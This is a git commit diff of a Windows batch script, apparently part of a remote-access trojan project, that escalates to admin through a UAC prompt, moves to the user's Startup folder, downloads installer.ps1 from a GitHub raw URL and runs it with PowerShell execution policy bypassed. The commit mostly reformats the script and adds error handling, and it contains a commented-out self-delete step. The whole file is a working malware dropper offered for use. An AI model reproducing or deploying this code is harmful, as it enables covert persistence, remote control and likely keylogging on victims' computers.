79f4389e574f7299739caf4a4a6dd8e156f10313
jfrdgh <162196506+jfrdgh@users.noreply.github.com>
2024-03-10 15:12:53 +0000

    Update GetAdmnInstKL.cmd

--- files/GetAdmnInstKL.cmd
+++ files/GetAdmnInstKL.cmd
@@ -1,21 +1,23 @@
 @echo off
 REM get admin permissions for script
-REM created by : jfrdgh (@bigmanlc on dc)
+REM created by: jfrdgh (@bigmanlc on dc)
 
 :: BatchGotAdmin
 :-------------------------------------
-REM  --> check for permissions
-    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
->nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+REM --> check for permissions
+IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
 ) ELSE (
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 )
 
 REM --> if error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
-) else ( goto gotAdmin )
+) else (
+    goto gotAdmin
+)
 
 :UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
@@ -30,15 +32,22 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-
 REM cd to startup
 set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cd %STARTUP%
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/installer.ps1 -OutFile installer.ps1"
-cd %STARTUP%
-powershell ./installer.ps1
+powershell -ExecutionPolicy Bypass -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/installer.ps1' -OutFile installer.ps1"
+if %errorlevel% neq 0 (
+    echo Failed to download installer.ps1.
+    exit /b %errorlevel%
+)
+
+powershell -ExecutionPolicy Bypass -File installer.ps1
+if %errorlevel% neq 0 (
+    echo Failed to execute installer.ps1.
+    exit /b %errorlevel%
+)
 
 @REM self delete
 @REM del GetAdmnInstKL.cmd
